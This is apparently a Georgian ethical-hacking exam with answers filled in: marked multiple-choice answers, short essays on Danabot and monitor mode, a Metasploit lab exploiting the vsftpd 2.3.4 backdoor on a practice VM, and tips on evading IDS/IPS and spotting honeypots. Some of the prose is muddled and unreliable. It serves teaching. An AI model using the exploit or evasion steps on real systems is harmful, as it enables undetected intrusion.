აირჩიეთ სწორი პასუხი, თითოეული კითხვა არის 0.5 ქულიანი:
1.	როგორი ტიპის სკანირება არ არსებობს?
•	Ping Sweep,
•	Nmap stealthy scan,
•	Vulnerability scan,
•	Nmap T12 scan 1

2.	Cyber Kill Chain -ის რომელ ფაზაზე მიმდინარეობს ენუმერაცია?
•	Exploitation,
•	Delivery,
•	Reconnaissance, 1
•	Weaponization.

3.	შესაძლებელია თუ არა ენუმერაცია განხორციელდეს Footprinting-ის გარეშე?
•	დიახ, შესაძლებელია, 1
•	არა, შეუძლებელია,
•	დამოკიდებულია ადგილობრივ კანონმდებლობაზე,
•	არც ერთი პასუხი არ არის სწორი.

4.	ჩამოთვლილთაგან  სკანირების ხელსაწყო არ არის:
•	Nmap,
•	Snort, 1
•	Wireshark,
•	Nessus.

5.	როგორი ტიპის ტროიანია R.A.T?
•	Remote Access, 1
•	Remote Availability,
•	Redundancy Access,
•	Redundancy Availability.

6.	ჩამოთვლილთაგან არ არსებობს:
•	Thin WHOIS server,
•	Thick WHOIS Server,
•	Headless WHOIS server, 1
•	არც ერთი პასუხი არ არის სწორი.
7.	Maltego დაწერილია პროგრამულ ენა:
•	Python-ზე,
•	C++ -ზე,
•	Java - ზე, 1
•	GoLang-ზე.

8.	Network Mapping არის:
•	ენუმერაციის მაგალითი,
•	ექსლპოტის გაშვების მაგალითი,
•	სოციალური ინჟინერიის მაგალითი,
•	Footprinting-ის მაგალითი. 1



უპასუხეთ შეკითხვებს, თითოეული შეკითხვა არის 3 ქულიანი:
1.	რა არის Danabot ტროიანი? აღწერეთ მისი გავრცელებისა და მოქმედების ალგორითმი.

•	Danabot არის თანამედროვე ტროიანი პროგრამა, რომელიც თავდაპირველად შექმნილია ბარათის მონაცემების მოსაპოვებლად და მოტყუებული ტრანზაქციების ჩასატარებლად. ეს ტროიანი ხშირად გამოიყენება როგორც ფინანსური ჯაშუშობის ინსტრუმენტი. იგი მოიპოვებს ჩართული კომპიუტერების მონაცემებს, როგორიცაა პაროლები, საკრედიტო ბარათის ნომრები და სხვა მგრძნობიარე ინფორმაცია. Danabot-ის გავრცელების მეთოდები მოიცავს:
•	ფიშინგი: ზარალი შეიძლება მოხდეს როდესაც მომხმარებელი მიიღებს დაუყოვნებლივ სასარგებლო ელ-ფოსტას, რომელიც წაახალისებს მას მავნე ვებ-გვერდზე გადასვლისკენ.
•	სპამის შეტყობინებები: Danabot ხშირად იყენებს ელ-ფოსტის სპამ მარკეტინგულ კამპანიებს, რომ შეეცადოს მსხვერპლთა მანქანებზე მისი გადმოტვირთვა.
•	მალფორმაციები: ერთხელ თუ ტროიანი შედის კომპიუტერში, იგი გადმოწერს სხვა მავნე მულტი-ფუნქციურ ინსტრუმენტებს, რათა მოიპოვოს კონფიდენციალური ინფორმაცია და უზრუნველყოს დამკვირვებლებისგან კონტროლი.
•	Danabot ჩვეულებრივ განაგრძობს მონაცემების მოპოვებას და ვრცელდება სხვა მოწყობილობებზე ან ქსელზე.

2.	რას ნიშნავს Wi-Fi შეტევის შემთხვევაში Monitor Mode? რა განსხვავებაა, ვთქვათ wlan0 და wlan0mon ინტერფეისებს შორის?

Monitor Mode არის Wi-Fi ინტერფეისის რეჟიმი, რომელიც საშუალებას აძლევს კარტას დაიჭიროს და დააფიქსიროს ყველა Wi-Fi სიგნალი, რომელიც გადის იმ კონკრეტულ სივრცეში, სადაც მოწყობილობა მდებარეობს. ეს ნიშნავს, რომ მოწყობილობა აღარ არის დაკავშირებული კონკრეტულ ქსელთან, არამედ მხოლოდ ყურადღებას ამახვილებს ნებისმიერ სიგნალზე, რომელიც აღმოჩნდება მის დიაპაზონში. ეს რეჟიმი მნიშვნელოვანია შეიტყოს ქსელის ჩაშლა, ტრეფიკის ანალიზი და სხვა სახის შეტევები, როგორიცაა WEP და WPA კრიპტოგრაფიის დამტვრევა.
wlan0 და wlan0mon ინტერფეისებს შორის განსხვავება:
•	wlan0: ეს არის ჩვეულებრივი ინტერფეისი, რომელიც დაკავშირებულია კონკრეტულ Wi-Fi ქსელთან და გამოყენება აქვს ინტერნეტთან დასაკავშირებლად.
•	wlan0mon: ეს არის ინტერფეისი, რომელიც გადართულია Monitor Mode-ზე და გამოიყენება მხოლოდ სიგნალების შესაფასებლად და დასაჭერად. როდესაც მოწყობილობა გადადის Monitor Mode-ში, ჩვეულებრივი wlan0 ინტერფეისი შეიცვლება wlan0mon-ად, რათა შესაძლებელია იყოს ყველა სხვა Wi-Fi ქსელის სიგნალების შეყვანა და ანალიზი.
მნიშვნელობა: wlan0mon ინტერფეისი აუცილებელია Wi-Fi შეტევების დროს, როდესაც მიზანია სხვა ქსელების, აგრეთვე მათი ტრეფიკების დაკვირვება.



პრაქტიკული დავალება 1 (10 ქულა):
Kali Linux-ის Metasploit-ით გატეხეთ Metasploitable ვირტუალური მანქანა, vsftpd სერვისის გამოყენებით. აუცილებელია გატეხვამდე დაასკანეროთ ვირტუალური მანქანა და სქრინშოტი გადაუღეთ ღია სერვისებს, ასევე, დაასქრინშოტეთ ექსპლოიტი რომლის გამოყენებასაც გეგმავთ.
Metasploitable მანქანის გატეხვის შემდეგ გახსნილ ტერმინალში გაუშვით ბრძანება pwd და სქრინშოტი გადაუღეთ მის შედეგს.

ყველა სქრინშოტი ჩასვით გამოცდის ფაილში, ამ დავალების ტექსტის ქვემოთ.

nmap -sV <Metasploitable_IP>
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Metasploitable_IP>
set RPORT 21
exploit

პრაქტიკული დავალება 2 (10 ქულა):
სცენარი:
უმცროსი ეთიკური ჰაკერი, რომელსაც სურს სამიზე ქსელის მონიტორინგი და  ტრაფიკის ანალიზი, უსაფრთხოების შეფასებისთვის, იყენებს Wireshark-ს და გეგმავს Nessus-ის გამოყენებას დაუცველობის სკანირებისთვის(Vulnerability scanning) კლიენტის ქსელში.

Რა მოხდა:
ჰაკერი პირდაპირ უკავშირდება მთავარ ქსელს, ქსელის ტოპოლოგიის ან არსებული უსაფრთხოების ზომების გათვალისწინების გარეშე. მან დაიწყო პაკეტების გადაჭერა Wireshark-ით ღიად,მისი დაფარვის(obfuscation) გარეშე.
Nessus-ის სკანირება დაიწყო ნაგულისხმევი(default) პარამეტრების გამოყენებით, სკანირებაც არა ნაკლებად აქტიურ დროს, არამედ შუადღისას დაგეგმა რადგან ჩათვალა, რომ დიდი ზომის ტრაფიკში Nessus-ის პაკეტებს ვერავინ შეამჩნევდა. თუმცა, ეს  ქცევა სწრაფად შენიშნა ქსელის უსაფრთხოების სისტემამ.
შედეგი:
ქსელის IPS-მა დაადგინა საეჭვო აქტივობა და ინფოსეკებმა გადაამისამართეს ჰაკერის მთელი ტრაფიკი honeypot ქსელში. ეს ქსელი რეალური ჩანდა, მაგრამ იყო იზოლირებული და ექვემდებარებოდა ინფოსეკის მიერ 24/7 მონიტორინგს. Honeypot-ში, ჰაკერების ყველა ქმედება იყო ჩაწერილი და გაანალიზებული რეალურ ქსელზე გავლენის გარეშე. Wireshark-ის პაკეტები ახლა მხოლოდ ხელოვნურად დაგენერირებულ მონაცემებს შეიცავდა honeypot-იდან.

უპასუხეთ შეკითხვას:
•	რა შეეშალა ეთიკურ ჰაკერს? როგორ უნდა მოქცეულიყო იმისათვის, რომ ქსელური დაცვის სისტემას ის ვერ გამოეჭირა?

•	შემშლელი ფაქტორები:
•	უსაფრთხოების ზომების უგულებელყოფა: ეთიკურმა ჰაკერმა დაუყოვნებლივ დააჯდა ქსელს, უსათუოდ არ გააანალიზა ქსელის ტოპოლოგია და არსებული უსაფრთხოების ზომები. ამის გამო, მისი ქმედებები აშკარად შეიმჩნევა ქსელის მონიტორინგის სისტემებში.
•	პაკეტების დასადებადობის არქონა: Wireshark-ის გამოყენება "ღია" გარემოში, დაფარვის გარეშე, ადვილად აღიქმება. უსაფრთხოების სისტემები ეძებენ ტრაფიკზე ნიმუშებს, რომლებიც არასწორად ფორმატირებული ან ზედმეტად აქტიური შეიძლება იყოს. ჰაკერმა უნდა დაეფარა ან იმოქმედა უფრო დაფარულად.
•	Nessus-ის გამოყენება დაუცველობის სკანირების დროს: Nessus-ის სკანირების დაწყება ნაგულისხმევი პარამეტრებით (default) საკმაოდ აშკარაა და უმეტეს შემთხვევაში, უსაფრთხოების სისტემები მოიცავს პარამეტრებს, რომლებიც სკანირების დროს გამორჩევას ახდენს.
•	სკანირების დროს აქტიურობის არგანალიზება: ჰაკერი მოიხსნა და დაიგეგმა სკანირება შუადღისას, როდესაც ქსელის ტრაფიკი ჩვეულებრივად მაღალი იყო. თუმცა, ქსელის მონიტორინგი არ ფლობს "ნორმალურ" ტრაფიკს, რის გამოც მაღალი აქტივობა შეიძლება გამოიჩინოს საეჭვოდ.
•	როგორ უნდა მოქცეულიყო ჰაკერი:
•	პირველ რიგში, უნდა განეხორციელებინა ქსელის ტოპოლოგიის ანალიზი. ჰაკერმა უნდა შეემოწმებინა ღია პორტები, მისასვლელობად რომ შეძლო უსაფრთხოების ზომების მინიმიზაცია. მაგალითად, უნდა ყოფილიყო ყურადღება გამახვილებული ისეთ ტექნოლოგიებზე, როგორიცაა IDS/IPS და სხვა სისტემები, რომლებიც სკანირებას აკეთებენ აქტიური ტრაფიკისთვის.
•	ტრეფიკი უნდა დაეფარა: ჰაკერმა უნდა გამოეყენებინა მეტი დაფარვის ტექნიკები, როგორიცაა VPN, Tor ან სპეციალური პაკეტების მორფინგი, რაც მას დაეხმარებოდა დაფარვაში.
•	Nessus-ის გამოყენება კონტროლირებადი, მინიმალურად ინტენსიური სკანირებით: ჰაკერმა უნდა განეხორციელებინა ნაკლებად აქტიური სკანირება, რათა არ გამოეტყუებინა უსაფრთხოების სისტემებს. შეიძლებოდა კონფიგურირებული პარამეტრების გამოყენება, რომელიც შეძლებდა ქსელში უფრო ბუნებრივად ჩადგომას.
•	სკანირების დროს უნდა ყოფილიყო უფრო სტრატეგიული: ჰაკერმა შეიძლება დაგეგმა სკანირების დრო ისე, რომ ნაკლები აქტივობა დაეტოვებინა. მაგალითად, ღამით, როდესაც ქსელის აქტივობა ნაკლები იყო.
•	
 

•	Honeypot, როგორც თქვენთვის ცნობილია, წარმოადგენს სატყუარას და ამ შემთხვევაში ის ყალბი ქსელი, იგივე Fakenet-ი იყო. რა შეიძლება გააკეთოს ჰაკერმა იმისათვის, რომ მიხვდეს რეალურ ქსელშია თუ არა?

Honeypot არის ერთგვარი "სატყუარა" ქსელი, რომელსაც იყენებენ იმისთვის, რომ შეამოწმონ მავნე აქტივობები და თავდასხმების მეთოდები. ასეთი ქსელი რეალურ სამყაროში ჩვეულებრივად არ მუშაობს და მისი მთავარი მიზანია ჰაკერების მოტყუება.
როგორ შეიძლება ჰაკერმა გაარკვიოს, თუ რეალურ ქსელშია?
1.	პროტოკოლის ანალიზი: ჰაკერმა უნდა შეამოწმოს მონაცემების ტრაფიკის ტიპი და ფორმატი. რეალურ ქსელში დაგროვებული და ტრაფიკის გადაცემა ჩვეულებრივდად გამოირჩევა სტანდარტული კომუნიკაციით, ვიდრე სუბტილურად შეყვანილი ხელოვნური მონაცემებით, რომლებიც ხშირად honeypot-ში გვხვდება.
2.	TCP/IP Stack-ის ვერსია და რეფერენციები: ჰაკერმა შეიძლება გაანალიზოს TCP/IP პროტოკოლის ვერსიები, TCP / SYN პაკეტების შაბლონები, თუ ისინი გამორჩეულად არასწორი ან უცნაური აღმოჩნდება, შეიძლება ნიშნავდეს, რომ ქსელი არის honeypot.
3.	Network Latency: Honeypot-ები შეიძლება მოქმედებდნენ სხვადასხვა network latency-ით. ჰაკერმა შეიძლება შეამჩნიოს, რომ ქსელი მუშაობს არასასიამოვნო ან ნელი ტემპით. ამის შესამოწმებლად შეიძლება სხვა ინდიკატორები იყოს.
4.	მენეჯმენტის სერვისების ანალიზი: ჰაკერი შეიძლება შეამოწმოს ისეთი სერვისები, რომლებიც ჩვეულებრივ არ უნდა იყვნენ ქსელში. მაგალითად, სერვისები ან დინამიური რესურსები, რომლებიც არ შეესაბამება ნორმალურ ქსელის მუშაობას.
5.	დამოკიდებულება რეალურ გარემოსთან: ჰაკერი შეიძლება დააკვირდეს რეალურ ქსელში ველურ ცვლილებებს, რაც დაადასტურებს, რომ ამ ქსელში მჭიდროდ იმყოფება უსაფრთხოების სისტემები და სერვისები, რომლებიც არ მუშაობენ honeypot-ებში.
6.	ბენჩმარკინგი და საკვანძო დინამიკა: Honeypot-ის ბაზაზე არსებულ ქსელებში უმეტეს შემთხვევაში დინამიკა განსხვავებულია რეალური ქსელისგან, მაგალითად, არასამართლიანი ან ტესტირება მონაცემების ან ნაკლები გამოსასყიდი სტრატეგიები.
დასკვნა: ჰაკერებს, რომლებიც მუშაობენ honeypot-ში, ხშირად უწევთ მეტი ყურადღების გამახვილება საკვანძო პარამეტრებზე, რათა შეამოწმონ ქსელის მდგომარეობა და გაიგონ, რეალურ ქსელში არიან თუ არა.


